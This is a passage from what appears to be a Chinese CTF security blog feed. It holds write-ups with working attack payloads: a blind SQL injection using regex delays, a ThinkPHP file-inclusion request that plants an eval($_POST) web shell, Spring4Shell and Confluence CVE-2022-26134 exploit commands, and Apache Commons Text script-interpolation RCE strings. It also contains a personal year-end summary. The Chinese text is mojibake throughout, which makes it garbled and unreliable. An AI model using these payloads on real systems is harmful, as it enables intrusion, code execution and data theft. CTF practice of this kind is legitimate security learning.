class="line">1&#x27;^%09case%09when%09(ascii(substr(database(),1,1))&gt;1)%09then%09(replace(&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;,&#x27;a&#x27;,&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;))%09rlike%090x28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b62%09else%091%09end--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select (replace(&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;,&#x27;a&#x27;,&#x27;aaaaaaaaaaaaaaaaaaa&#x27;)) rlike concat(replace(&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;,&#x27;a&#x27;,0x28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b28612e2a292b))</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 0CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023ç¬¬äº”å±Š Real World CTF ä½“éªŒèµ› Web</title>
      <link href="/2023/01/13/2023%E7%AC%AC%E4%BA%94%E5%B1%8A%20Real%20World%20CTF%20%E4%BD%93%E9%AA%8C%E8%B5%9B%20Web/"/>
      <url>/2023/01/13/2023%E7%AC%AC%E4%BA%94%E5%B1%8A%20Real%20World%20CTF%20%E4%BD%93%E9%AA%8C%E8%B5%9B%20Web/</url>
      
        <content type="html"><![CDATA[<h1 id="2023ç¬¬äº”å±Š-Real-World-CTF-ä½“éªŒèµ›-Web"><a href="#2023ç¬¬äº”å±Š-Real-World-CTF-ä½“éªŒèµ›-Web" class="headerlink" title="2023ç¬¬äº”å±Š Real World CTF ä½“éªŒèµ› Web"></a>2023ç¬¬äº”å±Š Real World CTF ä½“éªŒèµ› Web</h1><h2 id="Evil-MySQL-Server"><a href="#Evil-MySQL-Server" class="headerlink" title="Evil MySQL Server"></a>Evil MySQL Server</h2><p><a href="https://imgse.com/i/pS7duxx"><img src="https://s1.ax1x.com/2023/02/15/pS7duxx.md.png" alt="pS7duxx.md.png"></a></p><p>åˆ©ç”¨<a href="https://github.com/rmb122/rogue_mysql_server">rogue_mysql_server</a>æ„é€ æ¶æ„mysqlæœåŠ¡å™¨ä»¥ä»»æ„è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶</p><p>é…ç½®å¥½æ–‡ä»¶ï¼Œå¯åŠ¨æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯è¿æ¥å¾—åˆ°flagæ–‡ä»¶åï¼Œæœ€åè¿›è¡Œè¯»å–</p><h2 id="Be-a-Language-Expert"><a href="#Be-a-Language-Expert" class="headerlink" title="Be-a-Language-Expert"></a>Be-a-Language-Expert</h2><p>è€ƒç‚¹ä¸º<code>thinkphp lang rce</code>ï¼Œä¹Ÿæ˜¯Thinkphpå¤šè¯­è¨€åŠŸèƒ½å¯¼è‡´çš„ä»»æ„æ–‡ä»¶åŒ…å«é—®é¢˜ï¼Œå…·ä½“ä¿¡æ¯å‚è€ƒ<a href="https://tttang.com/archive/1865/">Thinkphp å¤šè¯­è¨€ RCE - è·³è·³ç³– (tttang.com)</a></p><p>æ‰“å¼€é¢˜ç›®å‘ç°æ˜¯thinkphp6</p><p><a href="https://imgse.com/i/pS7dgWn"><img src="https://s1.ax1x.com/2023/02/15/pS7dgWn.md.png" alt="pS7dgWn.md.png"></a></p><p>å‚è€ƒpç‰›çš„<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">æ–‡ç« </a>ï¼Œåˆ©ç”¨PearCMDæ¥å®ç°æœ€ç»ˆrceï¼Œ</p><p>å‘é€è¯·æ±‚åŒ…ï¼Œè®²shell.phpå†™å…¥&#x2F;tmpç›®å½•ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /?+config-create+/&amp;lang=../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/shell.php HTTP/1.1</span><br><span class="line">Host: x.x.x.x:xxxx</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œæ–‡ä»¶åŒ…å«</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxxx/index.php?lang=../../../../../../tmp/shell.php</span><br></pre></td></tr></table></figure><p>åå¼¹shellè·å¾—flag</p><h2 id="Spring4Shellï¼š"><a href="#Spring4Shellï¼š" class="headerlink" title="Spring4Shellï¼š"></a>Spring4Shellï¼š</h2><p><strong>CVE-2022-22965</strong></p><p>é¢˜ç›®å­˜åœ¨<code>.git</code>æ³„éœ²ï¼Œåˆ©ç”¨å·¥å…·æ¢å¤</p><p>æ­¤é¢˜éœ€è¦é€šè¿‡æ³„éœ²çš„ä¿¡æ¯ç¡®å®šshellçš„ä½ç½®ï¼Œå¯é€šè¿‡appBaseæ¥ç¡®å®šé¡¹ç›®è·¯å¾„</p><p>è·å–åˆ°webé¡¹ç›®è·¯å¾„<code>chaitin</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Host name=&quot;XXXX&quot;  appBase=&quot;chaitin&quot;</span><br></pre></td></tr></table></figure><p>å¯ç›´æ¥åˆ©ç”¨<a href="https://github.com/reznok/Spring4Shell-POC">Spring4ShellEXP</a>,é¡¹ç›®ä½ç½®éœ€è¦ä¿®æ”¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py --url http://xxxx/ --dir chaitin/ROOT</span><br></pre></td></tr></table></figure><h2 id="Be-a-Wiki-Hacker"><a href="#Be-a-Wiki-Hacker" class="headerlink" title="Be-a-Wiki-Hacker"></a>Be-a-Wiki-Hacker</h2><p>å‘ç°é¢˜ç›®<strong>Confluence</strong>ç‰ˆæœ¬ä¸º<strong>7.13.6</strong>ï¼Œæœç´¢å‘ç°<a href="https://blog.csdn.net/weixin_46944519/article/details/125141253">CVE-2022-26134 OGNLè¿œç¨‹ä»£ç æ‰§è¡Œ</a></p><p>ç›´æ¥åˆ©ç”¨GitHubè„šæœ¬rceå³å¯<a href="https://github.com/crowsec-edtech/CVE-2022-26134/">https://github.com/crowsec-edtech/CVE-2022-26134/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py -u http://xxxxx -c &quot;cat /flag&quot;</span><br></pre></td></tr></table></figure><h2 id="ApacheCommandText"><a href="#ApacheCommandText" class="headerlink" title="ApacheCommandText"></a>ApacheCommandText</h2><p>è¿‡æ»¤äº†å¾ˆå¤šå¸¸ç”¨åè®®,ä½†æ²¡æœ‰è¿‡æ»¤base64decoder,æ‰€ä»¥å¯ä»¥æŠŠç›´æ¥æŠŠpayloadè¿›è¡Œbase64åŠ å¯†å³å¯</p><p>æ„é€ å‘½ä»¤æ‰§è¡Œ<strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;script:JavaScript:var a=java.lang.Runtime.getRuntime().exec(&quot;/readflag&quot;);var b=a.getInputStream();var c=new java.io.BufferedReader(new java.io.InputStreamReader(b));c.readLine();&#125;</span><br></pre></td></tr></table></figure><p>base64åŠ å¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;base64decoder:JHtzY3JpcHQ6SmF2YVNjcmlwdDp2YXIgYT1qYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiL3JlYWRmbGFnIik7dmFyIGI9YS5nZXRJbnB1dFN0cmVhbSgpO3ZhciBjPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKG5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKGIpKTtjLnJlYWRMaW5lKCk7fQ==&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pS70ejx"><img src="https://s1.ax1x.com/2023/02/15/pS70ejx.md.png" alt="pS70ejx.md.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> competition </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022å¹´ç»ˆæ€»ç»“</title>
      <link href="/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
      <url>/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2022å¹´ç»ˆæ€»ç»“"><a href="#2022å¹´ç»ˆæ€»ç»“" class="headerlink" title="2022å¹´ç»ˆæ€»ç»“"></a>2022å¹´ç»ˆæ€»ç»“</h1><p>2022å¹´æ‚„ç„¶ç»“æŸï¼Œå›é¦–ä¸€å¹´çš„æ—¶å…‰ï¼Œç•™ä¸‹äº†ä¸¤ä¸ªæ¯”è¾ƒå¤§çš„é—æ†¾ã€‚</p><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>æ€»çš„æ¥è¯´ï¼Œä»Šå¹´çš„å­¦ä¹ è¿›åº¦è¿˜ç®—ä¸­è§„ä¸­çŸ©ï¼Œå­¦äº†ä¸€ä¸¢ä¸¢å°å°çš„å¼€å‘ï¼Œå…¶æ¬¡ï¼Œå¯¹pythonå’Œphpä¼šæ›´åŠ æ·±å…¥äº›äº†ï¼Œæœ€å¤§çš„æ”¶è·åº”è¯¥æ˜¯æ¥è§¦åˆ°äº†javaï¼Œjavaå®‰å…¨å§‹äºååºåˆ—åŒ–ï¼Œä¸ªäººæ„Ÿè§‰è¾ƒäºphpçš„ååºåˆ—åŒ–æ›´æœ‰æ„æ€ä¸€äº›ï¼Œä½†å…¥é—¨ä¹Ÿæ˜¯çœŸæ»´éš¾ï¼Œåœ¨è¢«æŠ˜ç£¨äº†ä¸€æ®µæ—¶é—´åï¼Œç»ˆäºç£•ç£•ç¢°ç¢°çš„å…¥äº†é—¨ã€‚</p><p>ä¸‹åŠå¹´å§ï¼Œä¸»è¦å°±æ˜¯åœ¨æ‰“æ¯”èµ›ï¼Œå¤ç°æ¯”èµ›ï¼Œå­¦ä¸€äº›æ–°ä¸œè¥¿ï¼Œåˆ°ä¹æœˆä»½åæœˆä»½å·¦å³ï¼Œå°±å¼€å§‹æ¥è§¦javaï¼Œä¹‹åå‡ ä¸ªæœˆä¹Ÿå·®ä¸å¤šï¼Œå°±æ–°å¢äº†ä¸ªå¯¹javaçš„å­¦ä¹ ã€‚</p><p>ä¸€æ•´å¹´ä¸‹æ¥ï¼Œæ¯”è¾ƒæ»¡æ„çš„è¿˜æ˜¯å¤§å¤§å°å°çš„æ¯”èµ›å‚åŠ çš„æŒºå¤šçš„(éš¾çš„æ—¶å€™åç‰¢ç¡®å®ä¹ŸæŒºæŠ˜ç£¨çš„~~)ï¼Œåƒä»€ä¹ˆå›½èµ›ï¼Œ0CTFï¼Œç½‘é¼æ¯ï¼ŒByteCTFï¼ŒHITCONâ€¦â€¦ï¼Œäº†è§£åˆ°å¾ˆå¤šå‰æ²¿çš„ä¸œè¥¿ï¼Œå“¦å¯¹äº†ï¼Œåœ¨2022å¹´å¼€å§‹æ¥è§¦åˆ°äº†å›½é™…èµ›ï¼Œç»™äººæ„Ÿå—ä¹Ÿæ˜¯é¢‡æ·±ï¼Œæ¶‰åŠåˆ°çš„çŸ¥è¯†éƒ½æ˜¯éå¸¸æ–°çš„ï¼Œå¾€å¾€æ˜¯æœ€æ–°çš„CVEæˆ–è€…ä¸€äº›trickï¼Œä»¥åŠä¸€äº›éå¸¸æœ‰è¶£çš„è®¾è®¡ï¼Œæœ€æœ€æœ€æœ€æœ€æœ€é‡è¦çš„æ˜¯â€”â€”å›½é™…èµ›å‡ ä¹é¢˜ç›®éƒ½ä¼šæä¾›dockerï¼ğŸ¤©</p><p>æœ€å¼€å¿ƒçš„ä»Šå¹´è®¤è¯†äº†å¥½å¤šå‰å®³çš„å¸ˆå‚…ï¼Œå¯ä»¥ç‹ ç‹ çš„å·å¸ˆäº†ğŸ˜</p><h2 id="Life"><a href="#Life" class="headerlink" title="Life"></a>Life</h2><p>ç”Ÿæ´»ä¸Šåˆ°æ²¡æœ‰ä»€ä¹ˆå¤§é£å¤§æµªï¼Œå…ˆæ˜¯å› ä¸ºç–«æƒ…åœ¨å®¶å¾…åˆ°å…«æœˆä»½æ‰å»å­¦æ ¡ï¼Œåˆ°å­¦æ ¡ååˆä¸€ç›´å°æ ¡ï¼Œå¯èƒ½æ¯”è¾ƒé—æ†¾çš„å°±æ˜¯æ²¡èƒ½å¥½å¥½å’Œæœ‹å‹å‡ºå»å­¦æ ¡èµ°èµ°ï¼Œç©ä¸€ç©ï¼Œå¹³å¹³æ·¡æ·¡çš„è¿‡äº†ä¸€æ•´å¹´ï¼Œå­¦æ ¡çš„è€ƒè¯•ä¹Ÿå…¨æ•°é¡ºåˆ©é€šè¿‡äº†ï¼Œå› ä¸ºæ¯”èµ›çº¿ä¸‹å»äº†å‡ ä¸ªåŸå¸‚ï¼Œä¸è¿‡å¤§éƒ¨åˆ†æ—¶é—´ä¹Ÿå‡ ä¹å°±æ˜¯åœ¨å®¾é¦†å’Œæ¯”èµ›åœºåœ°å¾…ç€ğŸ˜‹ã€‚å› ä¸ºç–«æƒ…ï¼Œæ„Ÿè§‰å°‘è®¤è¯†äº†å¥½å¤šäººï¼Œå°‘äº†å¥½å¤šå‡ºå»æºœè¾¾çš„æœºä¼šã€‚</p><h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p>1ã€æœ‰äº›è®¸æ‹–å»¶ç—‡ï¼Ÿ</p><p>2ã€åšå†³å®šæ—¶æ¯”è¾ƒå®¹æ˜“çŠ¹è±«ä¸å†³ï¼Œæ„Ÿè§‰æ— è®ºé€‰äº†å“ªä¸€ä¸ªéƒ½ä¼šåæ‚”æ²¡é€‰å¦ä¸€ä¸ªã€‚ã€‚ã€‚</p><p>3ã€åšäº‹æœ‰ç‚¹å®¹æ˜“åˆ†å¿ƒ</p><p>4ã€æœ‰ç‚¹æ€¥</p><h2 id="Expect"><a href="#Expect" class="headerlink" title="Expect"></a>Expect</h2><p>å¸Œæœ›å‘¢ï¼Œåœ¨2023å¹´èƒ½å¤Ÿå¥½å¥½é¢†ç•¥ä¸‹ç¥–å›½å¤§å¥½æ²³å±±(å°±æ˜¯èƒ½å¤šå‡ºå»èµ°èµ°çœ‹çœ‹~~)ï¼Œèƒ½å¤Ÿå¤šäº¤ä¸€äº›æœ‹å‹ï¼ŒæŠ€æœ¯ä¸Šèƒ½å¾—åˆ°è¾ƒå¤§æå‡ï¼Œæ·±å…¥å­¦ä¹ ä¸‹javaå®‰å…¨ï¼Œè¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€ã€‚å­¦ä¹ nodejsï¼Œå¤šå‚åŠ ä¸€äº›æ¯”èµ›ï¼Œèƒ½åœ¨æ¯”è¾ƒå¤§çš„æ¯”èµ›ä¸Šå¤šåšå‡ºä¸€äº›é¢˜ï¼Œå¤šæ²‰æ·€æ²‰æ·€ï¼ŒæŠŠè‡ªå·±è¿˜æœ‰å‡ ä¸ªæ²¡æ•²å®šçš„äº‹å°½æ—©ç»™å†³å®šä¸‹æ¥ğŸ˜Š</p><p>ç¬¬ä¸€æ¬¡å†™æ€»ç»“ï¼Œä¹Ÿä¸çŸ¥é“è¦è¯´ä»€ä¹ˆäº†ï¼Œ2022å¹´å°±è¿™æ ·å’¯ï¼Œ2023å¹´ä¸ç•™é—æ†¾å°±å¥½äº†ï¼ŒåŠ æ²¹å§ï¼ï¼ï¼ğŸ¤ª</p><p>å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ~å—~~</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå®‰å…¨ä¹‹è·¯--C3P0é“¾</title>
      <link href="/2022/11/19/C3P0/"/>
      <url>/2022/11/19/C3P0/</url>
      
        <content type="html"><![CDATA[<h1 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h1><p>C3P0 æ˜¯ä¸€ä¸ªå¼€æºçš„ JDBC è¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’Œ JNDI ç»‘å®šï¼Œæ”¯æŒ JDBC3 è§„èŒƒå’Œ JDBC2 çš„æ ‡å‡†æ‰©å±•ã€‚ç›®å‰ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰ Hibernateï¼ŒSpring ç­‰ã€‚ç®€å•æ¥è¯´ï¼ŒC3P0 å±äº jdbc çš„ä¸€éƒ¨åˆ†ã€‚</p><h2 id="ä¸€ã€ç¯å¢ƒæ­å»º"><a href="#ä¸€ã€ç¯å¢ƒæ­å»º" class="headerlink" title="ä¸€ã€ç¯å¢ƒæ­å»º"></a>ä¸€ã€ç¯å¢ƒæ­å»º</h2><p>æ–°å»ºä¸€ä¸ª<code>Maven</code>é¡¹ç›®ï¼Œåœ¨<code>pom.xml</code>ä¸­å¯¼å…¥<code>c3p0</code>ä¾èµ–</p><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 